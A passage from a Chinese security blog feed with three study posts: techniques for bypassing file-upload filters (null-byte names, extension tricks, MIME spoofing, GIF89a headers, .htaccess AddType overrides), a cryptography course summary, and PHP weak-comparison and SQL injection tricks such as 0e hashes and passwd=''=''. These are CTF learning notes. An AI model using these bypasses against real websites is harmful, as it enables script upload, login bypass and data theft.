    <content type="html"><![CDATA[<ul><li>服务器解析问题的漏洞</li><li>文件名的正则检测漏洞</li><li>其他的检测方式</li><li>关联知识预览</li></ul><a id="more"></a><h2 id="服务器解析问题的漏洞"><a href="#服务器解析问题的漏洞" class="headerlink" title="服务器解析问题的漏洞"></a>服务器解析问题的漏洞</h2><ol><li>在apache服务器中，扩展名是从右往左读的，在未知扩展名时，会自动读取下一个扩展名，像.rar .abc 等扩展名都是不能识别的</li><li>在ngnix中存在空字节漏洞，利用原理感觉比较极限，如果检测方式在遇到00时会抛弃后面的检测，文件test.jpg%00.php就能通过检测，这种情况在ngnix解析文件系统时会把00忽略所以相当于获得了文件test.jpg.php  <em>(容易和00截断弄混)</em></li><li>老版本的IIS中，存在;漏洞，IIS在解析文件名的时候可能将分号后面的内容丢弃，那么test.asp;jpg如果可以绕过的话就能够执行</li><li>老版本的IIS中，如果网站目录/.asp/下的所有内容都将作为asp脚本来解析</li></ol><h2 id="文件名的正则检测漏洞"><a href="#文件名的正则检测漏洞" class="headerlink" title="文件名的正则检测漏洞"></a>文件名的正则检测漏洞</h2><ol><li>00截断，形如test.php%00.jpg的文件在<code>$_FILES[&#39;file&#39;][&#39;name&#39;]</code>的时候就已经产生了截断，后端这时候获得的是test.php</li><li>因为是正则表达式，所以可以尝试以下写法能否绕过并被php解释器执行<blockquote><p>test.PhP<br>test.php3 test.php4</p></blockquote></li></ol><h2 id="其他的检测方式"><a href="#其他的检测方式" class="headerlink" title="其他的检测方式"></a>其他的检测方式</h2><ul><li>HTTP协议规定了上传资源的时候在Header中加上一项文件的MIMETYPE，类型的判断是由浏览器完成的，结果即为HTTP头中的Content-Type，使用burp拦截后修改为image/jpeg 或 text/plain 等即可</li><li><p>后端再验证文件格式，可以为php文件加上相应的幻术头来通过检测，一般加GIF的，因为这个直接加文本<code>GIF89a</code>即可</p><p>| 格式                         |            文件头             |<br>| ————————– | :————————: |<br>| GIF                        | GIF89a  对应二进制为474946383961 |<br>| JPG                        |    FFD8FFE000104A464946    |<br>| PNG                        |          89504E47          |<br>| TIFF (tif)                 |          49492A00          |<br>| Windows Bitmap (bmp)       |            424D            |<br>| CAD (dwg)                  |          41433130          |<br>| Adobe Photoshop (psd)      |          38425053          |<br>| Rich Text Format (rtf)     |         7B5C727466         |<br>| MS Word/Excel (xls.or.doc) |          D0CF11E0          |<br>| MS Access (mdb)            |    5374616E64617264204A    |<br>| ZIP Archive (zip)，         |          504B0304          |<br>| RAR Archive (rar)，         |          52617221          |<br>| Wave (wav)，                |          57415645          |<br>| AVI (avi)，                 |          41564920          |<br>| Real Media (rm)，           |          2E524D46          |<br>| MPEG (mpg)，                |          000001BA          |<br>| MPEG (mpg)，                |          000001B3          |<br>| Quicktime (mov)，           |          6D6F6F76          |<br>| Adobe Acrobat (pdf)，       |       255044462D312E       |<br>| Windows Media (asf)，       |      3026B2758E66CF11      |<br>| MIDI (mid)，                |          4D546864          |</p></li><li>通过.htaccess文件进行的限制，相应的可以使用.htaccess覆盖的方式来进行反制，书写并上传.htaccess文件即可</li></ul><table><thead><tr><th>.htaccess语法</th><th style="text-align:center">作用</th></tr></thead><tbody><tr><td><code>AddType application/x-httpd-php .txt</code></td><td style="text-align:center">将.txt文件使用php解释器执行</td></tr><tr><td><code>AddType text/plain .pl .py .php</code></td><td style="text-align:center">将以上后缀名的文件以纯文本的形式展示出来</td></tr><tr><td><code>&lt;FilesMatch &quot;\.(php)$&quot;&gt; ForceType text/plain &lt;/FilesMatch&gt;</code></td><td style="text-align:center">强行让apache将文件识别为你指定的类型</td></tr><tr><td><code>&lt;Files ^(*.jpeg)&gt;order deny,allow deny from all&lt;/Files&gt;</code></td><td style="text-align:center">使得该文件夹里面只有图片扩展名的文件才可以被访问，其他类型都是拒绝访问</td></tr><tr><td><code>Options -ExecCGI AddHandler cgi-script .php .pl .py .jsp .asp .htm .shtml .sh .cgi</code></td><td style="text-align:center">以上几种类型的文件被访问的时候，会返回403 Forbidden的错误</td></tr></tbody></table><h2 id="关联知识预览"><a href="#关联知识预览" class="headerlink" title="关联知识预览"></a>关联知识预览</h2><p>文件上传之前我们只是在讨论单纯文件名，文件格式的检测绕过方法，但如果涉及到上传文件的恶意代码检测方面的话，就需要继续考虑文件内容的绕过了，所谓<strong>免杀，一句话木马的变种，代码混淆</strong>都是与此相关的概念</p><h2 id="CTF中文件上传的结合出题点记录"><a href="#CTF中文件上传的结合出题点记录" class="headerlink" title="CTF中文件上传的结合出题点记录"></a>CTF中文件上传的结合出题点记录</h2><p>如何上传php可执行文件，这是用到的最多的，也是这篇笔记中尝试去总结的</p><p>文件上传+文件包含     在文件包含的笔记中记录了一些情景</p><p>文件上传+文件展示     相关的有软连接攻击啥的</p><p>文件上传+目录遍历      结合各种目录遍历漏洞得到上传文件的名字</p>]]></content>
    
    <summary type="html">
    
      &lt;ul&gt;
&lt;li&gt;服务器解析问题的漏洞&lt;/li&gt;
&lt;li&gt;文件名的正则检测漏洞&lt;/li&gt;
&lt;li&gt;其他的检测方式&lt;/li&gt;
&lt;li&gt;关联知识预览&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>密码学结课后的一些想法以及总结（下）</title>
    <link href="https://someonesometimes.github.io/2017/04/26/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%BB%93%E8%AF%BE%E5%90%8E%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95%E4%BB%A5%E5%8F%8A%E6%80%BB%E7%BB%93(%E4%B8%8B)/"/>
    <id>https://someonesometimes.github.io/2017/04/26/密码学结课后的一些想法以及总结(下)/</id>
    <published>2017-04-26T11:56:41.000Z</published>
    <updated>2017-05-08T06:31:36.807Z</updated>
    
    <content type="html"><![CDATA[<p>断断续续的，为时一年的密码学也终于在今天的结课考试中告一段落，之所以在这里写下这些零碎的想法，是因为总感觉这是一个很关键的转折点。之前一年的学习主要是对密码学所涉及的数学知识以及现行加密体系的掌握，学习了部分数论，加密算法流程等。<br><a id="more"></a><br>总感现在很多的渗透中很少考虑密码学方面的漏洞，如果面对的是一个正规加密算法，我们在已知的算法漏洞，或是实际实现中所遗漏的漏洞之外，几乎不会对现行的密码体制做出任何攻击的尝试，密码学课中所讲授的各种基于密码算法的攻击方式，大多都是理论可行的范畴而身边少有例子，毕竟理论上现在计算极限是2^80但实际攻击中你来个试试。。。可能也正是此原因，总觉得我应该把当下对这些知识的理解都写下来，也许目前就是我对密码学认识最清楚的时候了，日后可能再也没有机会能这样正规，这样没有明确目的驱动去学习这样一套系统的理论性知识了。<br>不管怎样，所有叙事的开端都要先感谢钟神这一年的教导，您渊博的知识以及很和我胃口的讲授方式使我一直认为密码学这门课是我目前上过的最有趣的课，没有之一~~~</p><hr><h1 id="基于单向函数的非对称密码算法"><a href="#基于单向函数的非对称密码算法" class="headerlink" title="基于单向函数的非对称密码算法"></a>基于单向函数的非对称密码算法</h1><h2 id="首先描述最最基础的单项函数"><a href="#首先描述最最基础的单项函数" class="headerlink" title="首先描述最最基础的单项函数"></a>首先描述最最基础的单项函数</h2><p><strong>我所学习的单向函数有三个</strong></p><ul><li>基于大素数分解困难性的单向函数</li><li>基于DLP离散对数问题的单向函数<br><em>（基于一个循环群的生成元每次给定指数而生成的结果具有不确定性，在循环群上，又可以分成广义的循环群以及循环子群）</em></li><li>基于ECC椭圆曲线的单向函数<br><em>（和DLP很像，只是循环群是在椭圆曲线上构建的，生成元也是椭圆曲线上的一个点，同样是基于给定一个参数和生成元运算的结果具有不确定性）</em></li></ul><p><strong>相应的数论基础</strong></p><ul><li>这种基于循环群的问题最早要追溯到原根与循环群的讲解中，在一个循环群中，由原根可以遍历出所有的元素<em>（记得当时原根的寻找方法，欧拉公式求互素的个数什么的，学习了好长的时间，都属于数论中的基础）</em>，DLP与ECC本质上都是基于循环群中生成元生成元素的不确定性来做的。</li><li>二次剩余与勒让德符号值是椭圆曲线中涉及到的概念，遍历一个椭圆曲线中所有的点方法就是拿着x值来实验，带入x后的结果就会形成形如y^2=xxmodp的形式，那么y是否有解<em>（勒让德符号值来判断）</em>，有解下y的两个解是多少<em>（华罗庚的一个理论中提到了部分计算方法）</em>。实际ECC算法实施中，其实并用不到这些概念</li></ul><p><strong>现行的攻击方式———针对单向函数问题的降复杂度解法</strong></p><ul><li>针对循环群的问题，如果是广义循环群的的话，可以使用基于CRT的指数溢出攻击，貌似还有数域筛？等进行攻击，复杂度与安全等级可以下降相当多</li><li>针对循环子群以及ECC这种模是素数的，无法基于CRT进行拆分后的攻击，可以使用基于生日悖论的 pollard_pho算法以及BSGS大步小步法来进行计算，可以下降根号的复杂度即使安全等级下降一半</li></ul><h2 id="基于单向函数可以做哪些事情"><a href="#基于单向函数可以做哪些事情" class="headerlink" title="基于单向函数可以做哪些事情"></a>基于单向函数可以做哪些事情</h2><h3 id="hint：所有基于单项函数实现的功能，其安全强度都是所使用的单向函数的安全强度"><a href="#hint：所有基于单项函数实现的功能，其安全强度都是所使用的单向函数的安全强度" class="headerlink" title="hint：所有基于单项函数实现的功能，其安全强度都是所使用的单向函数的安全强度"></a>hint：所有基于单项函数实现的功能，其安全强度都是所使用的单向函数的安全强度</h3><p><strong>可以基于单向函数制定一些公钥密码算法了</strong><br>hint：其实基于下面的描述，我感觉公钥密码算法的大致框架就是两种：RSA与Elgamal</p><ul><li>RSA是基于大整数分解这个单向函数来制定的<br><em>但是学习了Elgamal算法后我总觉得RSA没有前者那样灵活而有趣，因为他是固定的公钥与私钥</em></li><li>Elgamal是基于DLP单向函数来制定的，其本质上就是利用DH密钥交换的key进行简单的加密操作，这个体系是发送方发送密文加公钥的，因此是非确定性加密的，即并没有明确的公钥之说</li><li>基于ECC的公钥密码算法？好像并没有学习，只是在数字签名中使用到了，用法和Elgamal是差不多的</li></ul><p><strong>数字签名中使用的是公钥密码算法</strong><br>可以感觉到就是对公钥算法的那两种框架进行了改动，使其能够完成签名、签名验证的功能</p><ul><li>使用RSA的私钥签名，公钥解密。针对RSA特点，对信息进行预处理，将x进行hash以减少长度，hash中加入salt以改善确定性加密的问题</li><li>使用Elgamal的验证体系，使用私钥d与Ke签名，对方使用规定流程进行验证</li><li>对Elgamal的验证体系改进后——DSA，将公钥的签名对象进行hash，将DLP基于的循环群改为循环子群以提高安全强度</li><li>使用ECDSA，将循环群改为了椭圆曲线上的，相应的改变并不大</li></ul><p><strong>进行密钥协商</strong></p><ul><li>通过DH密钥交换协议，我才真正认识到基于单向函数算法的优点——没有传输一点敏感数据实现了密钥的协商</li></ul><h2 id="公钥密码算法概览以及变动"><a href="#公钥密码算法概览以及变动" class="headerlink" title="公钥密码算法概览以及变动"></a>公钥密码算法概览以及变动</h2><p>公钥密码算法无法加密过大的东西，因此应用的场景如上面所述常用于数字签名的身份认证，密钥协商等方面。这都是众所周知的。</p><p>从你的私钥是世界上唯一独有的角度来看，我们就能很容易的理解为什么公钥密码算法可以胜任身份证明的任务</p><p>我们从密钥协商中就能看出来公钥密码算法的一种特性：数据的传递并不需要安全通道就可以完成，因此让我们从对称加密的机密性中走出来，公钥密码算法中更多的考虑的是数据的完整性与数据认证与不可抵赖性，这些在后面的数字签名以及CA中心中我们可以看到，包括后面学习的很多攻击诸如中间人攻击、重放攻击等，都是基于数据真实性的角度来说的，这是我们学习公钥密码算法后才开始着重考虑的一个方面</p><hr><h1 id="关于数据真实性的那些事——Hash-MAC-DS"><a href="#关于数据真实性的那些事——Hash-MAC-DS" class="headerlink" title="关于数据真实性的那些事——Hash,MAC,DS"></a>关于数据真实性的那些事——Hash,MAC,DS</h1><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p><em>注意不要将所采用的结构与盒函数混为一谈，王小云的攻击是在MD5盒函数上的，hash应用中的各种问题是在结构上的</em></p><p><strong>可以提供的服务————消息完整性</strong></p><p><strong>Hash函数应当抵抗的几种攻击</strong>（攻击方式决定安全强度）</p><ul><li>不可逆性，这是肯定的</li><li>抗第二原象攻击 即在指定x1下很难找到另一个x2其hash值与前者相同以实现伪造<br><em>2^n个盒子里指定一个，选到的复杂度是2^n</em></li><li>强碰撞攻击 即很难找到两个具有相同hash值得x1与x2<br><em>书上的笔记给了应用的场景 攻击复杂度为2^n个盒子里，在2^n/2时就会有一个盒子里装有两个值，基于生日悖论</em></li></ul><p><strong>现行的Hash函数</strong><br><strong>MD结构</strong><br><em>个人认为并不是MD结构被攻破了，可能只是MD5的那个盒函数找到了碰撞的方法，而且就算没有这种攻击方式，以MD5那2^60的长度也是可以实施攻击的，只是钟神上课演示的碰撞明显不是2^60的复杂度，应该采用了那种攻击方式</em></p><ul><li>MD5（输出长度为128bit，抗强碰撞攻击强度为64bit，强碰撞攻击的碰撞算法已经给出）</li><li>SHA-1（输出长度为160bit，抗强碰撞攻击强度为80bit，未被攻破）</li><li>SHA2族 （输出长度为不同的值：SHA-224、SHA-256、SHA-384、SHA-512）</li></ul><p><strong>MD结构的劣势</strong></p><ul><li>这种结构依次往里面输入x值，因此能够在最后添加一些附加值并再进行一次盒内的运算从而获得新的hash值，在含key的hash中会出现问题</li><li>只有吸收x，多次吸收完后最终结果即为hash值，这样输出长度就是固定的</li><li>大概目前找到了MD5盒的攻击方式，其他MD结构的盒本身并没有找到攻击方式，上述问题是MD结构本身在应用中所存在的缺陷</li></ul><p><strong>Keccak结构</strong><br>SHA3族（SHA3-224、SHA3-256、SHA3-384、SHA3-512）<br>掌握SHA-3要注意以下几个方面：</p><ul><li>SHA-3根据不同的安全等级来确定它的输入长度也就是分块长度，具体是什么长度决定具有什么安全等级</li><li>在消息分块入盒前，有详细的填充方案</li></ul><p><strong>Keccak结构的优势</strong></p><ul><li>MAC中若是使用hash函数加key的方式，则使用MD结构的话，简单的将key与x组合会有问题，而是用基于Keccak结构的SHA-3的话就可以简单的组合就行了</li><li>Keccak使用的是海绵结构，首先将所有的x依次吸入，与MD结构不同的是此结构并不将最后一个盒的输出值作为hash结果，而是再进行盒运算以输出，这样实现了输出不同长度的hash结果</li></ul><p><strong>其他的补充</strong></p><ul><li>hash的基础结构都是对x进行分块，然后放入盒中，其分块长度也就是一个盒一次吸入多少的x，决定了hash的运行效率，当然盒内的设计也得要考虑</li></ul><h2 id="MAC"><a href="#MAC" class="headerlink" title="MAC"></a>MAC</h2><p><strong>简述</strong><br>简而言之，(x,MAC)的目的就是为了对x的完整性做出验证，而且要保证攻击者不能构造出其他x’的MAC码，或是不能求出修改后x’的MAC码<br>MAC的构建有两种思路，一是使用hash函数做出对消息的提取，然后在hash中加入key使得攻击者无法计算出x’的hash值；二是自己构建一种信息特征码的提取流程，在流程中录入所有x值，key值，最后得出的值就可以作为特征码MAC来用，又因为里面有着key，攻击者根据流程没有key而无法计算</p><p><strong>现行的MAC方案</strong></p><ul><li>HMAC 使用制定流程将x与ke融合一块后再hash的方案</li><li>GMAC 基于使用CTR的加密流程，将加密中的结果，padding，key值都吸收入，最后的结果作为MAC码，同时还得到了加密后的结果</li></ul><h2 id="Digatal-Signature"><a href="#Digatal-Signature" class="headerlink" title="Digatal Signature"></a>Digatal Signature</h2><p><strong>简述</strong><br>数字签名基于公钥体系构建，使用私钥签名hash(x),公钥解密进行验证，除了对信息完整性的验证外，因为使用私钥签名，所以可以做到身份验证，以达到不可否认服务。但正因为使用的公钥体系，签名的速度会很慢，因此才有了只进行信息完整性验证的MAC方案，那里面的key是双方已知的，基于对称加密。对了，DS的安全性也是基于单向函数的安全性的。</p><p><strong>现行的DS方案</strong></p><ul><li>基于RSA体系 使用私钥加密，公钥解密</li><li>基于Elgamal体系（并没有完全采用这种体系，但是单向函数还是一样的）——原始的方案，改进后的DSA，使用ECC的ECDSA</li></ul><hr><h1 id="密钥分配方案与CA证书"><a href="#密钥分配方案与CA证书" class="headerlink" title="密钥分配方案与CA证书"></a>密钥分配方案与CA证书</h1><p><strong>简述</strong><br>实际生产环境中，一个组织内部的通信使用密钥的话，是需要考虑专门的方案进行密钥分配的，毕竟使用对称加密的话，总密钥个数可是成O(2^n)的复杂度来增长的<br>如果使用对称加密方式的话，可以通过设置密钥分配中心来减少总密钥的个数，并基于MIT所研究的三头狗Kerburse建立session key的方式来保证安全性<br>如果使用非对称加密方式的话，密钥复杂度问题就可以完美解决，并设置CA认证中心对用户的公钥进行签名来保证安全性</p><h2 id="对称加密的分配方案以及安全性"><a href="#对称加密的分配方案以及安全性" class="headerlink" title="对称加密的分配方案以及安全性"></a>对称加密的分配方案以及安全性</h2><p><strong>分配方案</strong><br>通过设置密钥分配中心，使分配中心只保留与用户之间的长期密钥，在两个用户间需要通信的时候就建立sessionkey会话密钥并使用两个用户的长期密钥来发送过去<br>这样可使得一个组织中只保留n个数的长期密钥，越少也就会越安全，尤其是用户电脑中不会保存所有其他用户的密钥，并且新用户加入时不会影响到老用户</p><p><strong>安全性</strong><br>单纯的传输session key的话，因为没有时效性会受到重放攻击，因为没有通信双方的身份会收到攻击，因为没有验证分配中心的身份会受到攻击。Kerburse方案在通信请求者建立连接的时候使用挑战应答的方式验证了通信对方的身份，分配中心在生成的session key中加入时间戳以及通信双方的ID。这样即可提高了安全性</p><h2 id="非对称加密的安全性"><a href="#非对称加密的安全性" class="headerlink" title="非对称加密的安全性"></a>非对称加密的安全性</h2><p><strong>安全性</strong><br>以前以为证书就是公钥，学习后才知道其实是经过CA中心签名后的用户公钥。因为单纯的公钥在发放中很容易受到伪造，也没有统一的管理策略，因此有了现在的PKI中心来统一管理证书以及CA中心来为这些证书签名以表明这些是通过验证的。具体是为哪些签名就去看书吧。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;断断续续的，为时一年的密码学也终于在今天的结课考试中告一段落，之所以在这里写下这些零碎的想法，是因为总感觉这是一个很关键的转折点。之前一年的学习主要是对密码学所涉及的数学知识以及现行加密体系的掌握，学习了部分数论，加密算法流程等。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>PHP中弱类型的转化漏洞</title>
    <link href="https://someonesometimes.github.io/2017/04/19/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E8%BD%AC%E5%8C%96%E7%9A%84%E6%BC%8F%E6%B4%9E/"/>
    <id>https://someonesometimes.github.io/2017/04/19/PHP弱类型转化的漏洞/</id>
    <published>2017-04-19T15:15:47.000Z</published>
    <updated>2017-07-16T02:41:10.637Z</updated>
    
    <content type="html"><![CDATA[<h2 id="官方文档中的几句话已经说的很清楚了"><a href="#官方文档中的几句话已经说的很清楚了" class="headerlink" title="官方文档中的几句话已经说的很清楚了"></a>官方文档中的几句话已经说的很清楚了</h2><blockquote><p><strong>==是弱类型漏洞的罪恶根源</strong><br><strong>在==中，<em>数值和字符串比较</em>，则字符串会被转换为数值并且比较按照数值来进行。<em>两个可以完美转化为数值型的字符串</em>（0e123,0x123 但0e4fe，12f3不可），将转化为数值比较</strong></p><hr><p><strong>当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对，基本不会出现弱类型比较的漏洞</strong></p><hr><p><strong>对了，这些规则经过测试，在mysql的比较中是一样的</strong><br><a id="more"></a></p></blockquote><p><br></p><h2 id="从几个例子中学习字符型是如何转换为数值的："><a href="#从几个例子中学习字符型是如何转换为数值的：" class="headerlink" title="从几个例子中学习字符型是如何转换为数值的："></a>从几个例子中学习字符型是如何转换为数值的：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">其中0代表转化失败，转化成功即为对应的数值</div><div class="line">&apos;xie&apos;=&gt;0</div><div class="line">&apos;0xff&apos;=&gt;0xff</div><div class="line">&apos;0xfz&apos;=&gt;0xf</div><div class="line">&apos;0xzf&apos;=&gt;0  这个比较有趣，0是转化成功的结果，而不是转化失败的意思</div><div class="line">&apos;x1&apos;=&gt;0</div><div class="line">&apos;1x&apos;=&gt;1</div><div class="line">&apos;0e123456&apos;=&gt;0 很神奇，0e123这种数值代表幂写法，已经好几次碰到了</div></pre></td></tr></table></figure><p><br></p><h2 id="php弱类型漏洞的应用场景"><a href="#php弱类型漏洞的应用场景" class="headerlink" title="php弱类型漏洞的应用场景"></a>php弱类型漏洞的应用场景</h2><ul><li>对不同类型的比较,在使用==时，php会进行转化后再比较</li><li><p>判断中即使两端都是字符型的，但一些情况下仍然做出数值型的比较，将因数值型的比较特性导致某些判断被绕过，测试如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">数值型的比较特性：</div><div class="line">0e0 == 0       基于科学计数法的转换</div><div class="line">0x80 == 128    基于进制转换</div><div class="line"></div><div class="line">那么如下比较将成立</div><div class="line">&apos;0e0&apos; == &apos;0&apos;</div><div class="line">&apos;0x80&apos; == &apos;128&apos;</div></pre></td></tr></table></figure></li><li><p>一些其他的比较场景</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0 == NULL</div><div class="line">flag&#123;xxx&#125;=&apos;&apos;=&apos;&apos;</div></pre></td></tr></table></figure></li><li><p>类型的运算的结果都是数值型的，如果参数有字符型的话，就按照上述的转换方式来转换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&apos;flagpig&apos;+1 = 1</div><div class="line">&apos;11zip&apos;+1=12</div><div class="line">&apos;0&apos;+&apos;1&apos;+&apos;0&apos;=1</div><div class="line">&apos;xie&apos;+&apos;fei&apos;=0</div></pre></td></tr></table></figure></li></ul><p><br></p><h2 id="记录比赛中关于判断的一些例子"><a href="#记录比赛中关于判断的一些例子" class="headerlink" title="记录比赛中关于判断的一些例子"></a>记录比赛中关于判断的一些例子</h2><ul><li>md5(password)==md5(username)<br>基于转后后是十六进制数值，利用两个数值的幂写法进行了绕过。。。</li><li>使用<code>strcmp</code>进行比较的判断中，文档中给出：<code>int strcmp ( string $str1 , string $str2 )</code>，如果一个参数是数组，将产生NULL结果，若对结果进行strcmp()==0判断，将通过</li><li>使用一个很有意思的逻辑：<code>任意字符串+0 = 任意字符串</code>,这样就可以把字符串转化为0而通过所有与字符串比较的弱类型判断</li><li>数据库的题目，可以使用where “xie”=”meng”=”fei”来实现判断或者经常使用的passwd=’’=’’</li><li>两个数值的相等判断，可以使用幂的表示方法：<code>0e123==0e456</code></li><li>返回结果==false时，因为0==false，除0外的所有数字==true，这样可能实现绕过。但如果是使用返回结果===false时，就没法伪造返回结果为数字，因为此时要求比较的类型也是相同的，只有真正的返回结果可以做到</li><li><strong>利用’0’+’1’的结果是数值型,这种利用可以用在mysql注入中，这样可以把预定的sex=’xx’转化为sex=数值型对象，接下来就是判断中类型转化的原理了</strong><br>应用：sex=’0’+’1’+’0’ 第一个0用于闭合句式中的前引号，最后一个0用于闭合句式中的后引号，中间的将用于盲注，是0是1将影响输出结果  本题将有两个结果：sex=0 or sex=1 产生两种不同情况以作为盲注判断条件</li><li>使用这样一种判断：<code>$req[&#39;number&#39;]==strval(intval($req[&#39;number&#39;]))</code>,之前一直担心先intval再strval会把进制与科学记数法的姿势限制住，测试后才意识到两边都是字符型的数值下，会进行转换的，因此req[‘number’]=0e00是没有问题的，可以通过比较</li><li>一般弱类型语言都会有浮点数精度问题，像python，php都存在的。<br>所以if(“0.999999999999999999999999” == 1)是成立的，<br>同理if(“1.00000000000000000000001” == 1)也是成立的</li><li>1e-324 == 0成立    (int)1e-324 &gt; 0成立    利用的应该也是精度问题</li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;官方文档中的几句话已经说的很清楚了&quot;&gt;&lt;a href=&quot;#官方文档中的几句话已经说的很清楚了&quot; class=&quot;headerlink&quot; title=&quot;官方文档中的几句话已经说的很清楚了&quot;&gt;&lt;/a&gt;官方文档中的几句话已经说的很清楚了&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;==是弱类型漏洞的罪恶根源&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;在==中，&lt;em&gt;数值和字符串比较&lt;/em&gt;，则字符串会被转换为数值并且比较按照数值来进行。&lt;em&gt;两个可以完美转化为数值型的字符串&lt;/em&gt;（0e123,0x123 但0e4fe，12f3不可），将转化为数值比较&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;当用 === 或 !== 进行比较时则不进行类型转换，因为此时类型和数值都要比对，基本不会出现弱类型比较的漏洞&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;对了，这些规则经过测试，在mysql的比较中是一样的&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
